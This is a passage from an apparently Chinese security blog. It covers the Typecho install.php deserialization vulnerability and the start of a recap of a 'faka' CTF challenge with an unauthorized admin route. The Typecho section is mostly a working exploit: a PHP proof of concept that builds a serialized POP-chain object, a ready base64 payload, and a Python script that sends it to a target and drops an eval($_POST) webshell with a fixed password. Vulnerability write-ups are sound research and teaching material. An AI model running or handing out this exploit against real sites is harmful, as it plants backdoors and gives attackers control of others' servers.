<p>&#x6700;&#x7EC8;POP&#x94FE;&#x4E3A;:<br><code>install.php</code> &#x4E2D;&#x7684; <code>unserialize</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x53EF;&#x63A7; <code>$config</code> &#x503C;&#x5BFC;&#x81F4;&#x7684; <code>$config[&apos;adapter&apos;]</code>&#x53EF;&#x63A7;&#x3002;<br>&#x2014;&#x2014;&#x300B;<code>Db.php</code> &#x4E2D;&#x8FDB;&#x884C;PHP&#x7C7B;&#x578B;&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#xFF0C;&#x89E6;&#x53D1; <code>$config[&apos;adapter&apos;]</code>&#x53EF;&#x63A7;&#x7C7B;&#x7684; <code>__tostring</code> &#x65B9;&#x6CD5;<br>&#x2014;&#x2014;&#x300B;<code>Feed.php</code> &#x4E2D; <code>__tostring</code> &#x65B9;&#x6CD5;&#x5185;&#x8C03;&#x7528;&#x53EF;&#x63A7;&#x5236;&#x7C7B;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x6570;&#x636E;<code>$item[&apos;author&apos;]-&gt;screenName)</code> &#x89E6;&#x53D1; <code>__get</code>&#x65B9;&#x6CD5;<br>&#x2014;&#x2014;&#x300B;<code>Request.php</code> &#x4E2D; <code>__get</code>&#x65B9;&#x6CD5;&#x8C03;&#x7528; <code>get</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8C03;&#x7528; <code>_applyFilter</code>&#x65B9;&#x6CD5;&#x4E2D; &#x7684; <code>call_user_func</code>&#xFF0C;&#x63A7;&#x5236;&#x5176;&#x5185;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x5B9E;&#x73B0;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p>&#x5176;&#x5B9E;&#x5149;&#x770B;POP&#x94FE;&#x4E0D;&#x600E;&#x4E48;&#x590D;&#x6742;&#xFF0C;&#x4F46;&#x662F;&#x91CC;&#x9762;&#x6BCF;&#x4E00;&#x6B65;&#x6784;&#x9020;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x5C1D;&#x8BD5;&#x8C03;&#x7528;&#x90FD;&#x662F;&#x8981;&#x7ECF;&#x8FC7;&#x5F88;&#x591A;&#x6B21;&#x7684;&#x8DDF;&#x8FDB;&#x548C;&#x5206;&#x6790;&#x7684;&#x3002;</p>
<h2 id="&#x7F16;&#x5199;-POC-amp-EXP"><a href="#&#x7F16;&#x5199;-POC-amp-EXP" class="headerlink" title="&#x7F16;&#x5199; POC &amp; EXP"></a>&#x7F16;&#x5199; POC &amp; EXP</h2><p>&#x987A;&#x7740; @pupiles &#x5E08;&#x5085; bypass <code>ob_start()</code> &#x7684;&#x601D;&#x8DEF;&#x5199;&#x7684;POC&#x3002;&#x4F46;&#x662F;&#x4F7F;&#x7528; @pupiles &#x5E08;&#x5085;blog&#x4E2D;&#x7684; POC &#x53EF;&#x80FD;&#x6709;&#x4E00;&#x70B9;&#x5C0F;&#x95EE;&#x9898;&#x3002;&#x7531;&#x4E8E;PHP&#x4E2D;&#x53CC;&#x5F15;&#x53F7;&#x5177;&#x6709;&#x89E3;&#x6790;&#x6548;&#x679C;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; POST &#x4F1A;&#x88AB;&#x89E3;&#x6790;&#xFF0C;&#x6700;&#x7EC8;&#x5199;&#x5165;&#x7684; webshell &#x7684;&#x4EE3;&#x7801;&#x4E3A; <code>&lt;?php @eval()?&gt;</code></p>
<p><img src="/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113200014621.png" alt="image-20201113200014621"></p>
<p>&#x56E0;&#x6B64;&#x6539;&#x826F;POC&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//&#x7F16;&#x5199;&#x6700;&#x540E; call_user_func &#x51FD;&#x6570;&#x5229;&#x7528;&#x7684;&#x7C7B;</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $_filter = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">private</span> $_params = <span class="hljs-keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&apos;assert&apos;</span>;   <span class="hljs-comment">//&#x91C7;&#x7528;&#x4F20;&#x7EDF;&#x56DE;&#x8C03;&#x5229;&#x7528;&#xFF0C;call_user_func + assert</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&apos;screenName&apos;</span>] = <span class="hljs-string">&apos;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[P2hm1n]); ?&gt;&quot;)&apos;</span>; <span class="hljs-comment">//bypass ob_start()&#x9650;&#x5236;</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&apos;RSS 2.0&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> $_type;</span><br><span class="line">    <span class="hljs-keyword">private</span> $_items = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-keyword">self</span>::RSS2;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;author&apos;</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$final = <span class="hljs-keyword">new</span> Typecho_Feed();</span><br><span class="line">$poc = <span class="hljs-keyword">array</span>(</span><br><span class="line">    <span class="hljs-string">&apos;adapter&apos;</span> =&gt; $final,</span><br><span class="line">    <span class="hljs-string">&apos;prefix&apos;</span> =&gt; <span class="hljs-string">&apos;typecho_&apos;</span></span><br><span class="line">);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize($poc)));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5229;&#x7528;&#x9020;&#x6210;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#x6765;&#x6784;&#x9020;POC&#x3002;&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-keyword">$this</span>::RSS2;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;category&apos;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="hljs-string">&apos;author&apos;</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x7B80;&#x5355;&#x7684;exp&#x7F16;&#x5199;&#x5982;&#x4E0B;&#xFF0C;&#x6CA1;&#x6709;&#x5BF9;url&#x505A;&#x7EC6;&#x81F4;&#x7684;&#x5904;&#x7406;&#x3002;&#x5F02;&#x5E38;&#x5904;&#x7406;&#x4E5F;&#x4E0D;&#x591F;&#x7EC6;&#x81F4;&#x3002;</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&apos;http://typecho/&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">(url)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;http//&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;https://&quot;</span> <span class="hljs-keyword">in</span> url:</span><br><span class="line">        url = url</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        url = <span class="hljs-string">&apos;http://&apos;</span> + url</span><br><span class="line"></span><br><span class="line">    target = url + <span class="hljs-string">&apos;/install.php?finish&apos;</span></span><br><span class="line">    fakerefer = url + <span class="hljs-string">&apos;/install.php&apos;</span></span><br><span class="line">    payload = <span class="hljs-string">&apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D&apos;</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="hljs-string">&apos;User-Agent&apos;</span>: <span class="hljs-string">&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Referer&apos;</span>: fakerefer,</span><br><span class="line">        <span class="hljs-string">&apos;cookie&apos;</span>: payload</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        html = requests.get(url=target, headers=headers, timeout=<span class="hljs-number">5</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> html.status_code == <span class="hljs-number">404</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;no install.php&apos;</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            print(<span class="hljs-string">&apos;mkdir:./shell.php, shell_password=P2hm1n&apos;</span>)</span><br><span class="line">    <span class="hljs-keyword">except</span>:</span><br><span class="line">        print(<span class="hljs-string">&apos;something wrong&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:</span><br><span class="line">    exp(url)</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2><p>&#x9996;&#x5148;&#x6B63;&#x5E38;&#x5B89;&#x88C5; typecho&#xFF0C;&#x672C;&#x5730;&#x73AF;&#x5883; MacOS + MAMP PRO(PHP7.3.9+Mysql5.7)</p>
<p>&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E2D;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x53BB;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x5E76;&#x4E0D;&#x4F1A;&#x5E2E;&#x52A9;&#x4F60;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7136;&#x540E;&#x5199;&#x5165;&#x6570;&#x636E;&#x3002;</p>
<p>&#x8BBF;&#x95EE; url &#x4E3A; <a href="http://typecho/install.php?finish&#x3002;" target="_blank" rel="noopener">http://typecho/install.php?finish&#x3002;</a> refer&#x8BBE;&#x7F6E;&#x6839;&#x636E;&#x81EA;&#x8EAB;&#x60C5;&#x51B5;&#x6539;&#x53D8;</p>
<p>POST&#x53C2;&#x6570;&#x5982;&#x4E0B;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5373;&#x53EF;&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210; <code>shell.php</code> &#x6587;&#x4EF6;&#xFF0C;&#x5BC6;&#x7801;&#x4E3A; <code>P2hm1n</code></p>
<p><img src="/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113200103970.png" alt="image-20201113200103970"></p>
<h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h2><p><a href="https://lihuaiqiu.github.io/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a><br><a href="https://paper.seebug.org/424/" target="_blank" rel="noopener">https://paper.seebug.org/424/</a></p>
</body></html>]]></content>
      <categories>
        <category>PHP Sec</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯线下半决赛 faka 题目复盘</title>
    <url>/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<html><head></head><body><p>&#x534A;&#x51B3;&#x8D5B;&#x6CA1;&#x6709;&#x505A;&#x51FA;&#x6765;&#xFF0C;&#x611F;&#x89C9;&#x6709;&#x4E9B;&#x9057;&#x61BE;&#x3002;&#x56E0;&#x6B64;&#x8FD8;&#x662F;&#x51B3;&#x5B9A;&#x4E0B;&#x6765;&#x590D;&#x76D8;&#x4E00;&#x4E0B;&#x3002;</p>
<a id="more"></a>

<h1 id="&#x60C5;&#x666F;&#x518D;&#x73B0;"><a href="#&#x60C5;&#x666F;&#x518D;&#x73B0;" class="headerlink" title="&#x60C5;&#x666F;&#x518D;&#x73B0;"></a>&#x60C5;&#x666F;&#x518D;&#x73B0;</h1><h2 id="&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;"><a href="#&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;" class="headerlink" title="&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;"></a>&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;</h2><p>&#x9898;&#x76EE;&#x6E90;&#x7801;&#x7ED3;&#x6784;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201129230432131.png" alt="image-20201129230432131"></p>
<p>&#x5176;&#x5B9E;&#x5728;&#x62FF;&#x5230;&#x6E90;&#x7801;&#x65F6;&#x5C31;&#x4E0D;&#x65AD;&#x63E3;&#x6D4B;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x610F;&#x56FE;</p>
<p>&#x9898;&#x76EE;&#x4E2D;&#x7684; hint &#x4E5F;&#x7ED9;&#x5230;&#xFF1A;www-data &#x6743;&#x9650;&#x7528;&#x6237;&#x53EF;&#x5199;&#x76EE;&#x5F55;&#x53EA;&#x6709; runtime &#x8DDF; static&#x3002;&#x6240;&#x4EE5;&#x5F53;&#x65F6;&#x5C31;&#x60F3;&#x597D;&#x4E86;&#x5BA1;&#x8BA1;&#x7684;&#x91CD;&#x70B9;&#xFF1A;</p>
<ol>
<li>&#x5404;&#x7C7B;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570; + &#x5199;&#x5165;&#x8DEF;&#x5F84;&#x53EF;&#x63A7;</li>
<li>RCE + <code>file_put_contents</code> &#xFF08;&#x5982;&#x679C;&#x771F;&#x80FD;RCE&#xFF0C;&#x8C8C;&#x4F3C;&#x4E5F;&#x4E0D;&#x7528;&#x5199;shell&#xFF0C;&#x76F4;&#x63A5;&#x8BFB;&#x5C31;&#x884C;&#xFF09; </li>
<li>SQLi</li>
</ol>
<p>&#x7136;&#x540E; html &#x4E0B;&#x9762;&#x7ED9;&#x5230;&#x4E86; 1.txt &#x91CC;&#x9762;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x6CE8;&#x518C;&#x9080;&#x8BF7;&#x7801;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130113423226.png" alt="image-20201130113423226"></p>
<p>&#x5F53;&#x65F6;&#x8FD8;&#x4EE5;&#x4E3A;&#x8FD9;&#x4E48;&#x660E;&#x663E;&#x7684;&#x63D0;&#x793A;&#x4E00;&#x5B9A;&#x662F;&#x6697;&#x793A;&#x4EC0;&#x4E48;&#xFF08;&#x7ED3;&#x679C;&#x597D;&#x50CF;&#x8FD9;&#x4E2A;txt&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#xFF1F;&#xFF09;&#xFF0C;&#x8FD8;&#x4EE5;&#x4E3A;&#x662F;&#x4ECE;<code>index.php/register</code> &#x5229;&#x7528;&#x6CE8;&#x518C;&#x7801;&#x8FDB;&#x53BB;&#xFF0C;&#x7136;&#x540E;&#x6253;  <code>/merchant</code>&#x3002;&#x7ED3;&#x679C;&#x5728;  <code>/merchant</code> &#x627E;&#x4E86;&#x534A;&#x5929;&#x4E5F;&#x6CA1;&#x627E;&#x5230;&#x6F0F;&#x6D1E;&#x70B9;&#x3002;</p>
<p>&#x7136;&#x540E;&#x770B;&#x5230;&#x8DDF; <code>html</code> &#x540C;&#x7EA7;&#x76EE;&#x5F55;&#x4E0B;&#x7684; <code>tk.sql</code>&#x3002;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130113351974.png" alt="image-20201130113351974"></p>
<p>&#x5F53;&#x65F6;&#x627E;&#x5230;&#x4E86;md5&#x4E4B;&#x540E;&#x4EE5;&#x4E3A;&#x80FD;&#x8FDB;&#x540E;&#x53F0;&#x3002;&#x4F46;&#x662F;&#x73B0;&#x573A;&#x8FD8;&#x662F;&#x65AD;&#x7F51;&#x73AF;&#x5883;&#xFF08;WTF&#xFF1F;&#x90A3;&#x6211;&#x600E;&#x4E48;&#x89E3;&#xFF1F;&#xFF09;&#x7528;&#x5E38;&#x89C1;&#x5F31;&#x5BC6;&#x7801;&#x5355;&#x5411;&#x751F;&#x6210;&#x540E;&#x6BD4;&#x5BF9;&#x4E5F;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x6709;&#x76F8;&#x540C;&#x7684;&#x3002;&#x540C;&#x65F6;&#x8FD8;&#x4E0D;&#x80FD;&#x7206;&#x7834;&#x540E;&#x53F0;&#xFF0C;&#x4E5F;&#x6CA1;&#x4EC0;&#x4E48;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x8FD9;&#x7C7B;&#x7684;&#x4E1C;&#x897F;&#x3002;</p>
<p>&#x7136;&#x540E;&#x5F53;&#x65F6;&#x9898;&#x76EE;&#x73AF;&#x5883;&#x8FD8;&#x662F; tp5.0.14&#x3002;RCE &#x8C8C;&#x4F3C;ban&#x4E86;&#x597D;&#x591A;&#x51FD;&#x6570;&#x3002;&#x5F53;&#x65F6;&#x5984;&#x60F3;&#x901A;&#x8FC7;&#x975E;&#x9884;&#x671F;&#x89E3;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x3002;</p>
<p>&#x6700;&#x540E;&#x8FD8;&#x662F;&#x575A;&#x4FE1;&#x6F0F;&#x6D1E;&#x70B9;&#x5728;&#xFF1A; <code>/merchant</code> &#x4E0B;&#x9762;&#x3002;&#x4E00;&#x4E0B;&#x5348;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x5728;  <code>/merchant</code> &#x7684;&#x5BA1;&#x8BA1;&#x548C; tp5 RCE &#x7684;&#x7ED5;&#x8FC7;&#x5EA6;&#x8FC7;&#x4E86;&#x2026;</p>
<p>&#x8D5B;&#x540E;&#x5B9E;&#x9A8C;&#x5BA4;&#x7684;&#x5C0F;&#x4F19;&#x4F34; @jokuuy &#x544A;&#x8BC9;&#x6211;&#x540E;&#x53F0;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x70B9;&#x672A;&#x6388;&#x6743; orz&#x3002;&#x800C;&#x4E14;&#x4E4B;&#x524D;&#x4ED6;&#x5BA1;&#x8FC7;&#x8FD9;&#x4E2A; CMS&#xFF0C;&#x636E;&#x8BF4;10s&#x53EF;&#x4EE5;&#x79D2;&#x6389;23333</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130155105699.png" alt="image-20201130155105699"></p>
<h2 id="&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;"><a href="#&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;" class="headerlink" title="&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;"></a>&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;</h2><p>&#x5F53;&#x65F6;&#x6CA1;&#x8003;&#x8651;&#x5230;&#x672A;&#x6388;&#x6743;&#x2026;&#x672A;&#x6388;&#x6743;&#x7684;&#x8BDD;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x5F88;&#x591A;&#x540E;&#x53F0;&#x7684;&#x6F0F;&#x6D1E;&#xFF08;&#x5F53;&#x65F6;&#x5C31;&#x770B;&#x5230;&#x4E86;manage/backup &#x90A3;&#x4E2A;&#x70B9;&#xFF09;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x8FDB;&#x5230;&#x540E;&#x53F0;&#x3002;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x80FD;&#x591F;&#x5229;&#x7528;&#x5230;<code>manage</code> &#x548C; <code>admin</code> &#x4E24;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4EE3;&#x7801;&#x3002;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130150358458.png" alt="image-20201130150358458"></p>
<h1 id="&#x9898;&#x76EE;&#x5206;&#x6790;"><a href="#&#x9898;&#x76EE;&#x5206;&#x6790;" class="headerlink" title="&#x9898;&#x76EE;&#x5206;&#x6790;"></a>&#x9898;&#x76EE;&#x5206;&#x6790;</h1><h2 id="&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;"><a href="#&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;" class="headerlink" title="&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;"></a>&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;</h2><p><code>http://wdb-vul/index.php/admin/index/info</code> &#x672A;&#x6388;&#x6743;&#x6DFB;&#x52A0;&#x7528;&#x6237;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130151254446.png" alt="image-20201130151254446"></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130151507883.png" alt="image-20201130151507883"></p>
<p>&#x4E4B;&#x540E;&#x8BBF;&#x95EE;&#x67D0;&#x4E9B;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x8DEF;&#x7531;&#x4F1A;&#x53D1;&#x751F;&#x8FD9;&#x6837;&#x7684;&#x60C5;&#x51B5;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130151800748.png" alt="image-20201130151800748"></p>
<p>&#x63D0;&#x793A;&#x6743;&#x9650;&#x4E0D;&#x591F;&#x3002;</p>
<p>&#x5728; SQL &#x5217;&#x4E2D;&#xFF0C;<code>authorize</code> &#x8D77;&#x5230;&#x4E86;&#x6743;&#x9650;&#x9650;&#x5236;&#x7684;&#x4F5C;&#x7528;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152235493.png" alt="image-20201130152235493"></p>
<p>&#x56DE;&#x6EAF; <code>authorize</code> &#x7684;&#x63A7;&#x5236;</p>
<p><code>application/admin/controller/Index.php#info</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152416366.png" alt="image-20201130152416366"></p>
<p>&#x8DDF;&#x8FDB; <code>_form</code>&#xFF0C; <code>callback</code> &#x8C03;&#x7528; <code>_form_filter</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152519359.png" alt="image-20201130152519359"></p>
<p>&#x8DDF;&#x8FDB; <code>_form_filter</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152612313.png" alt="image-20201130152612313"></p>
<p>&#x8BF4;&#x660E;&#x76F4;&#x63A5; POST &#x53C2;&#x6570;&#x5373;&#x53EF;&#x3002;</p>
<p> <img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130153248088.png" alt="image-20201130153248088"></p>
